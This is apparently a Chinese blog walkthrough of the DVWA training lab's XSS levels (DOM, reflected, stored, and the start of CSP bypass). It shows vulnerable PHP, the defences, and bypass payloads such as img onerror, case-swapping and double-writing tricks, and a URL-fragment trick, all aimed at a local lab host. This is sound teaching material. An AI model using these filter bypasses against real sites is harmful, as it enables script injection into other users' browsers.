@@ -1,0 +1,746 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DVWA:XSS - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="DOM-XSS（DOM型跨站脚本攻击）XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">DVWA:XSS</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">DVWA:XSS</h1>
+        <div class="stuff">
+            <span>三月 06, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="DOM-XSS（DOM型跨站脚本攻击）"><a href="#DOM-XSS（DOM型跨站脚本攻击）" class="headerlink" title="DOM-XSS（DOM型跨站脚本攻击）"></a>DOM-XSS（DOM型跨站脚本攻击）</h1><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p>
+<p>DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如URL，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。</p>
+<p>可能触发DOM型XSS的属性：</p>
+<p>document.referer属性</p>
+<p>window.name属性</p>
+<p>location属性</p>
+<p>innerHTML属性</p>
+<p>documen.write属性</p>
+<h3 id="document-和-windows-对象"><a href="#document-和-windows-对象" class="headerlink" title="document 和 windows 对象"></a>document 和 windows 对象</h3><p>document表示的是一个文档对象，window表示的是一个窗口对象，一个窗口下可以有多个文档对象。</p>
+<p>所以一个窗口下只有一个window.location.href，但是可能有多个document.URL、document.location.href</p>
+<p>window 对象</p>
+<p>它是一个顶层对象,而不是另一个对象的属性即浏览器的窗口。</p>
+<p>document 对象</p>
+<p>该对象是window和frames对象的一个属性,是显示于窗口或框架内的一个文档。</p>
+<p>document 只是属于window 的一个子对像。</p>
+<p>window.location 包含 href 属性，直接取值赋值时相当于 window.location.href</p>
+<p>window.location.href 当前页面完整 URL</p>
+<p>document.location 包含 href 属性，直接取值赋值时相当于 document.location.href</p>
+<p>document.location.href 当前页面完整 URL</p>
+<p>document.href 没有这个属性</p>
+<p>document.URL 取值时等价于 window.location.href 或 document.location.href。在某些浏览器中通过对 document.URL 赋值来实现页面跳转，但某些浏览器中不行。</p>
+<h3 id="indexOf-方法"><a href="#indexOf-方法" class="headerlink" title="indexOf()方法"></a>indexOf()方法</h3><p>定义和用法</p>
+<p>indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。</p>
+<p>indexOf(searchvalue,fromindex)<br>参数    描述<br>searchvalue    必需。规定需检索的字符串值。<br>fromindex    可选的整数参数。规定在字符串中开始检索的位置。它的合法取值是 0 到 stringObject.length - 1。如省略该参数，则将从字符串的首字符开始检索。</p>
+<p>注释：indexOf() 方法对大小写敏感！</p>
+<p>注释：如果要检索的字符串值没有出现，则该方法返回 -1<br>输出0-16</p>
+<h3 id="substring-方法"><a href="#substring-方法" class="headerlink" title="substring() 方法"></a>substring() 方法</h3><p>substring() 方法用于提取字符串中介于两个指定下标之间的字符。</p>
+<p>substring(start,stop)<br>参数    描述<br>start 必需。    一个非负的整数，规定要提取的子串的第一个字符在 stringObject 中的位置。<br>stop 可选。    一个非负的整数，比要提取的子串的最后一个字符在 stringObject 中的位置多 1。<br>如果省略该参数，那么返回的子串会一直到字符串的结尾。    </p>
+<p>decodeURI() 函数可对 encodeURI() 函数编码过的 URI 进行解码</p>
+<h3 id="document-write"><a href="#document-write" class="headerlink" title="document.write"></a>document.write</h3><p>document.write详解</p>
+<p>document.write是JavaScript中对document.open所开启的文档流(document stream操作的API方法，它能够直接在文档流中写入字符串，一旦文档流已经关闭，那document.write就会重新利用document.open打开新的文档流并写入，此时原来的文档流会被清空，已渲染好的页面就会被清除，浏览器将重新构建DOM并渲染新的页面</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>选择English</p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\3.png" alt="3"></p>
+<p>前端源码</p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\2.png" alt="2"></p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1.png" alt="1"></p>
+<p>服务器端源码</p>
+<pre><code>&lt;?php
+
+# No protections, anything goes
+
+?&gt;</code></pre>
+<p>可以看到，前端使用 document.write() 动态生成页面，服务器端代码没有任何的保护性措施！</p>
+<p>页面本意是叫我们选择默认的语言，但是对default参数没有进行任何的过滤。</p>
+<pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=&lt;script&gt;alert('xss')&lt;/script&gt;</code></pre>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\4.png" alt="4"></p>
+<p>F12</p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\5.png" alt="5"></p>
+<p>看到脚本被插入</p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php
+
+// Is there any input?
+// array_key_exists()检查键是否存在
+array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。
+提示：如果指定数组的时候省略了键名，将会生成从 0 开始并以 1 递增的整数键名
+array_key_exists(key,array)
+key 必需    规定键名。
+array    必需。规定数组
+if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {
+    $default = $_GET['default'];
+
+    # Do not alLow script tags
+//过滤&lt;script，含scriipt的就不可以
+stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）
+stripos(string,find,start)
+string 必需    规定被搜索的字符串。
+find 必需    规定要查找的字符。
+start 可选    规定开始搜索的位置。
+返回值：    返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释：字符串位置从 0 开始，不是从 1 开始。
+    if (stripos ($default, "&lt;script") !== false) {
+//如果参数不含&lt;script
+header() 函数向客户端发送原始的 HTTP 报头
+header(string,replace,http_response_code)
+string 必需    规定要发送的报头字符串。
+replace 可选    指示该报头是否替换之前的报头，或添加第二个报头。
+默认是 true（替换）。false（允许相同类型的多个报头）。
+http_response_code可选    把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）
+
+        header ("location: ?default=English");
+        exit;
+    }
+}
+
+?&gt;</code></pre>
+<p>很明显，这里过滤了 &lt;script ，那么我们可以使用&lt;img src=1 onerror=alert(‘xss’)&gt;绕过。</p>
+<pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English&lt;img src=1 οnerrοr=alert('xss')&gt; </code></pre>
+<p>未成功执行<img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426164742152-626531704.png" alt="1375459-20200426164742152-626531704"></p>
+<pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=&gt;&lt;/option&gt;&lt;img src=1 onerror=alert('xss')&gt;</code></pre>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426165203052-197710952.png"></p>
+<pre><code>http://127.0.0.1/vulnerabilities/xss_d/?default=&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert('xss')&gt;</code></pre>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426165933780-960362727.png" alt="1375459-20200426165933780-960362727"></p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code>&lt;
+&lt;?php
+
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {
+
+    # White list the alLowable languages
+//白名单，只允许French、English、German、Spanish
+    switch ($_GET['default']) {
+        case "French":
+        case "English":
+        case "German":
+        case "Spanish":
+            # ok
+            break;
+        default:
+            header ("location: ?default=English");
+            exit;
+    }
+}
+
+?&gt;</code></pre>
+<p>白名单 只允许 传的 default值 为 French English German Spanish 其中一个</p>
+<p>构造攻击语句</p>
+<pre><code>http://192.168.31.155/dvwa-master/vulnerabilities/xss_d/?default= English #</code></pre>
+<p>English # </p>
+<p>URL中#号之后的内容，在提交表单时，被当成注释，不会被提交到服务器</p>
+<pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English # &lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+<p>可以看到，我们的script脚本成功执行了</p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426161303047-1450475024.png" alt="1375459-20200426161303047-1450475024"></p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php
+
+# Don't need to do anything, protction handled on the client side
+
+?&gt;</code></pre>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426163351876-1011661984.png" alt="1375459-20200426163351876-1011661984"></p>
+<p>由于大多数浏览器默认将从URL中获取的内容进行编码，而客户端的源代码中直接将编码后的输入插入到了动态页面中（可以与low级别的客户端代码进行比较），从而阻止了执行任何注入的JavaScript。</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English">http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English</a><script>alert('xss')</script></p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426171158637-222348334.png" alt="1375459-20200426171158637-222348334"></p>
+<p>我们查看网页源代码，发现这里对我们输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签。所以，就不存在XSS漏洞了。</p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426171421791-967272941.png" alt="1375459-20200426171421791-967272941"></p>
+<h1 id="reflected-XSS（反射型跨站脚本攻击）"><a href="#reflected-XSS（反射型跨站脚本攻击）" class="headerlink" title="reflected-XSS（反射型跨站脚本攻击）"></a>reflected-XSS（反射型跨站脚本攻击）</h1><p>反射型Xss &lt;全称跨站脚本攻击，是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中</p>
+<p>其实反射型和DOM型的XSS差别主要在于，反射型是会往后台服务器发送请求，而DOM型直接在前端进行解析；两者都是一次性的</p>
+<h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+// arrary_key_exists()函数：判断$_GET的值中是否存在“name”键名。并且$_GET[‘name’]的值是否不为空，满足这些条件，直接输出下面的输出语句。
+
+if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) {
+    // Feedback for end user
+    echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';
+}
+
+?&gt;
+</code></pre>
+<p>array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。<strong>这里键名为</strong> <strong>name</strong></p>
+<p>可以看到，low级别的代码只是判断了name参数是否为空，如果不为空的话就直接打印出来，并没有对name参数做任何的过滤和检查，存在非常明显的XSS漏洞。</p>
+<p>输入</p>
+<pre><code>&lt;script&gt;alert('xss')&lt;/script&gt;</code></pre>
+<p>得到</p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\XSS-reflect-Low输入.png" alt="XSS-reflect-Low输入"></p>
+<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) {
+//将输入中的&lt;script&gt;转化为空
+    $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] );
+
+    // Feedback for end user
+    echo "&lt;pre&gt;Hello ${name}&lt;/pre&gt;";
+}
+
+?&gt;</code></pre>
+<p>str_replace()函数不太完美，因为它区分大小写</p>
+<h4 id="1-大写绕过"><a href="#1-大写绕过" class="headerlink" title="1.大写绕过"></a>1.大写绕过</h4><pre><code>&lt;SCRIPT&gt;alert('xss')&lt;/SCRIPT&gt;</code></pre>
+<h4 id="2-双写绕过"><a href="#2-双写绕过" class="headerlink" title="2.双写绕过"></a>2.双写绕过</h4><pre><code>&lt;sc&lt;script&gt;ript&gt;alert('xss')&lt;/script&gt;</code></pre>
+<h4 id="3-构造不使用"><a href="#3-构造不使用" class="headerlink" title="3.构造不使用"></a>3.构造不使用</h4><pre><code>&lt;img src=1 onerror=alert('xss')&gt;he</code></pre>
+<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php
+header ("X-XSS-Protection: 0");
+if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { 
+//使用通配符，完全匹配script*N，所以有关script的标签全被过滤
+    $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
+    echo "&lt;pre&gt;Hello ${name}&lt;/pre&gt;";
+}
+
+?&gt;
+</code></pre>
+<p>可以看到，high级别的代码使用了正则表达式直接把 &lt;*s*c*r*i*p*t 给过滤了，* 代表一个或多个任意字符，i 代表不区分大小写。所以，我们的<script>标签在这里就不能用了。</p>
+<p>但是我们可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
+<pre><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></pre>
+<h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php
+if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123;
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
+    // Get input
+//转码
+&amp; （和号） 成为 &amp;amp;
+&quot; （双引号） 成为 &amp;quot;
+&#39; （单引号） 成为 &amp;#039;
+&lt; （小于） 成为 &amp;lt;
+&gt; （大于） 成为 &amp;gt;
+    $name = htmlspecialchars( $_GET[ &#39;name&#39; ] );
+    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;
+&#125;
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+<p>**htmlspecialchars(string)**：</p>
+<p>把预定义的字符 “&lt;” （小于）、 “&gt;” （大于）、&amp; 、‘’、“” 转换为 HTML 实体，防止浏览器将其作为HTML元素。</p>
+<p>当我们输入 <script>alert('xss')</script> ，因为 htmlspecialchars 函数会将 &lt; 和 &gt; 转换成html实体,并且<em>n<strong>a</strong>m**e</em>取的是</p>
+<p>name的值，然后包围在</p><pre></pre>标签中被打印出来，所以我们插入的语句并不会被执行。<p></p>
+<h1 id="Stored-XSS（存储型跨站脚本攻击）"><a href="#Stored-XSS（存储型跨站脚本攻击）" class="headerlink" title="Stored-XSS（存储型跨站脚本攻击）"></a>Stored-XSS（存储型跨站脚本攻击）</h1><p>攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。因为存储型XSS的代码存在于网页的代码中，可以说是永久型的。</p>
+<p>存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
+<h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ 'btnSign' ] ) ) {
+    // Get input
+// trim(string,charlist)
+函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。
+    $message = trim( $_POST[ 'mtxMessage' ] );
+    $name    = trim( $_POST[ 'txtName' ] );
+
+    // Sanitize message input
+// stripslashes(string)
+函数删除字符串中的反斜杠。
+    $message = stripslashes( $message );
+// mysql_real_escape_string(string,connection)
+函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。
+    $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Sanitize name input
+    $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Update database
+    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+    //mysql_close();
+}
+?&gt;</code></pre>
+<h4 id="trim-string-charlist"><a href="#trim-string-charlist" class="headerlink" title="trim(string,charlist)"></a><strong>trim(string,charlist)</strong></h4><p>函数移除字符串两侧的空白字符或其他预定义字符，可选参数charlist支持添加额外需要删除的字符，如果被省略，则移除以下所有字符：</p>
+<ul>
+<li>“\0” - NULL</li>
+<li>“\t” - 制表符</li>
+<li>“\n” - 换行</li>
+<li>“\x0B” - 垂直制表符</li>
+<li>“\r” - 回车</li>
+<li>“ “ - 空格</li>
+</ul>
+<h4 id="mysql-real-escape-string-string-connection"><a href="#mysql-real-escape-string-string-connection" class="headerlink" title="mysql_real_escape_string(string,connection)"></a><strong>mysql_real_escape_string(string,connection)</strong></h4><p>函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p>
+<h4 id="stripslashes-string"><a href="#stripslashes-string" class="headerlink" title="stripslashes(string)"></a><strong>stripslashes(string)</strong></h4><p>函数删除字符串中的反斜杠。</p>
+<p>可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。</p>
+<p>message一栏输入<script>alert('xss')</script>，</p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\XSS-stored-low1.png" alt="XSS-stored-low1"></p>
+<p>用户名无法直接做XSS，因为前端代码有用户名长度限制</p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426184100977-925850173.png" alt="1375459-20200426184100977-925850173"></p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200426184441826-381338279.png" alt="img"></p>
+<p>或者</p>
+<p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\XSS-stored-low4.png" alt="XSS-stored-low4"></p>
+<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ 'btnSign' ] ) ) {
+    $message = trim( $_POST[ 'mtxMessage' ] );
+    $name    = trim( $_POST[ 'txtName' ] );
+// strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用&lt;b&gt;标签
+    $message = strip_tags( addslashes( $message ) );
+    $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $message = htmlspecialchars( $message );
+
+    $name = str_replace( '&lt;script&gt;', '', $name );
+    $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+?&gt;</code></pre>
+<h4 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags()"></a><strong>strip_tags()</strong></h4><p>函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用标签。</p>
+<h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a><strong>htmlspecialchars()</strong></h4><p>函数把预定义的字符转换为 HTML 实体。</p>
+<p>可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<script>。同反射型XSS的Medium级别一样，我们可以使用大写或者双写绕过。</p>
+<h4 id="1-大写绕过-1"><a href="#1-大写绕过-1" class="headerlink" title="1.大写绕过"></a>1.大写绕过</h4><pre><code>&lt;SCRIPT&gt;alert(&#39;xss&#39;)&lt;/SCRIPT&gt;</code></pre>
+<h4 id="2-双写绕过-1"><a href="#2-双写绕过-1" class="headerlink" title="2.双写绕过"></a>2.双写绕过</h4><pre><code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre>
+<h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
+    // Get input
+    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
+    $name    = trim( $_POST[ &#39;txtName&#39; ] );
+
+    // Sanitize message input
+    $message = strip_tags( addslashes( $message ) );
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $message = htmlspecialchars( $message );
+
+    // Sanitize name input
+    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+
+    // Update database
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+
+    //mysql_close();
+&#125;
+
+?&gt;</code></pre>
+<p>可以看到，这里使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。</p>
+<pre><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></pre>
+<h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
+
+    // Get input
+    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
+    $name    = trim( $_POST[ &#39;txtName&#39; ] );
+
+    // Sanitize message input
+    $message = stripslashes( $message );
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $message = htmlspecialchars( $message );
+
+    // Sanitize name input
+    $name = stripslashes( $name );
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $name = htmlspecialchars( $name );
+
+    // Update database
+    $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; );
+    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR );
+    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR );
+    $data-&gt;execute();
+&#125;
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+<p>可以看到，impossible级别的代码使用htmlspecialchars函数将message和name中的预定义字符转换成html实体，这样就防止了我们填入标签。而且使用token来防范CSRF攻击，使用PDO技术防御SQL注入，进一步提高了安全性。</p>
+<h1 id="CSP-Bypass（CSP绕过）"><a href="#CSP-Bypass（CSP绕过）" class="headerlink" title="CSP Bypass（CSP绕过）"></a>CSP Bypass（CSP绕过）</h1><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>Content-Security-Policy是指HTTP返回报文头中的标签，浏览器会根据标签中的内容，判断哪些资源可以加载或执行。翻译为中文就是内容安全策略。是为了缓解潜在的跨站脚本问题（XSS），浏览器的扩展程序系统引入了内容安全策略这个概念。原来应对XSS攻击时，主要采用函数过滤、转义输入中的特殊字符、标签、文本来规避攻击。CSP的实质就是白名单制度，开发人员明确告诉客户端，哪些外部资源可以加载和执行。开发者只需要提供配置，实现和执行全部由浏览器完成。</p>
+<p>两种方法可以启用CSP：</p>
+<ol>
+<li>一种是通过HTTP相应头信息的Content-Security-Policy字段；</li>
+<li>另一种是通过网页标签；</li>
+</ol>
+<p>例如：</p>
+<meta http-equiv="Content-Security-Policy" content="script-src  'self'; object-src 'none'; style-src cdn.example.org third-party.org;  child-src https:">
+
+<p>以上例子的意思如下：</p>
+<ol>
+<li>script-src脚本：只信任当前域名</li>
